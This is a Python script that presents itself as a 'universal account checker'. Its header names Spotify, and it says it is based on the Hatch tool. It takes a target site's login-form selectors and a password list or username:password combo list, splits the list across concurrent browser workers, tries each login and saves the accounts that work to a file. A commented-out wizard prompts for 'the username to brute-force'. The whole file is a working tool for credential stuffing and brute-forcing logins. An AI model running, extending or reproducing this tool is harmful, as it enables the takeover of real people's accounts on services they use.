#!/usr/bin/python3

# Spotify account checker:
# Works with username-password combo and single username and password list

# Based on Hatch coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--

from sys import stdout
from optparse import OptionParser
import datetime
import worker
import os


# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'


# Config#
parser = OptionParser()
now = datetime.datetime.now()

# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel", help="Choose the username selector")
parser.add_option("--passsel", dest="passsel", help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel", help="Choose the login button selector")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", dest="website", help="Choose a website")
parser.add_option("--usecombo", dest="usecombo", help="Choose wether use a combo list or a single username with password list. Combo lists must be in username:password format")
parser.add_option("--combolist", dest="combolist", help="Pass a whole combolist file")
parser.add_option("--workers", dest="workers", help="Spawn # concurrent workers")
parser.add_option("--succfile", dest="succfile", help="file used to store successfull accounts")
parser.add_option("--chromedriver", dest="chromedriver", help="Path of Chrome Driver")
(options, args) = parser.parse_args()

banner = color.BOLD + color.RED + '''Universal account checker by EmaMaker, based on Hatch by Metachar'''.format(
    color.RED, color.CWHITE, color.RED, color.GREEN,
    color.RED, color.CWHITE, color.RED, color.GREEN,
    color.RED, color.CWHITE, color.RED, color.GREEN)

'''def wizard():
    from account_checker import banner, color
    print (banner)
    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] ' + color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]' + color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]' + color.CWHITE + 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]' + color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]' + color.CWHITE + ' Website could not be located make sure to use http / https')
        exit()

    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)'''


if ((options.username is None or options.passlist is None) and (options.usecombo is None or bool(
        options.usecombo) == False)) or options.usernamesel is None or options.passsel is None or options.loginsel is None or options.website is None or (
        bool(options.usecombo) == True and options.combolist is None and options.chromedriver):
    print('Some important arguments are missing, run with -h or --help argument to get the help menu')
    
    exit()

if __name__ == "__main__":
    username = options.username
    username_selector = options.usernamesel
    password_selector = options.passsel
    login_btn_selector = options.loginsel
    website = options.website
    pass_list = options.passlist
    combo_list = options.combolist
    succfile = options.succfile
    workers = options.workers
    worker.CHROME_DVR_DIR = options.chromedriver

    if succfile is None:
        succfile = os.getcwd() + "/accounts_successfull.txt"

    if workers is None:
        workers = 1

    worker.succfile = succfile

    tot_lines = 0

    if options.usecombo == "True":
        file = combo_list
    else:
        file = pass_list

    f = open(file)
    tot_lines = sum(1 for line in f)
    f.close()

    lines_per_worker = int(float(tot_lines) / float(workers) + 1)

    print(banner)

    '''Splitting big file in multiple file for multiple workes:
    Code from here
    https://stackoverflow.com/questions/16289859/splitting-large-text-file-into-smaller-text-files-by-line-numbers-using-python'''
    smallfile = None
    with open(file, mode='r') as bigfile:
        for lineno, line in enumerate(bigfile):
            if lineno % lines_per_worker == 0:
                if smallfile:
                    smallfile.close()

                    if options.usecombo == "True":
                        w1 = worker.Worker(worker.Type.COMBO_LIST, username_selector, password_selector,
                                           login_btn_selector,
                                           website, smallfile.name, username)
                    else:
                        w1 = worker.Worker(worker.Type.PASS_LIST, username_selector, password_selector,
                                           login_btn_selector,
                                           website, smallfile.name, username)
                    w1.start()

                small_filename = os.getcwd() + '/small_file_{}.txt'.format(lineno + lines_per_worker)
                smallfile = open(small_filename, "w")
            smallfile.write(line)
        if smallfile:
            smallfile.close()

            if options.usecombo == "True":
                w1 = worker.Worker(worker.Type.COMBO_LIST, username_selector, password_selector, login_btn_selector,
                                   website, smallfile.name, username)
            else:
                w1 = worker.Worker(worker.Type.PASS_LIST, username_selector, password_selector, login_btn_selector,
                                   website, smallfile.name, username)
            w1.start()

    bigfile.close()
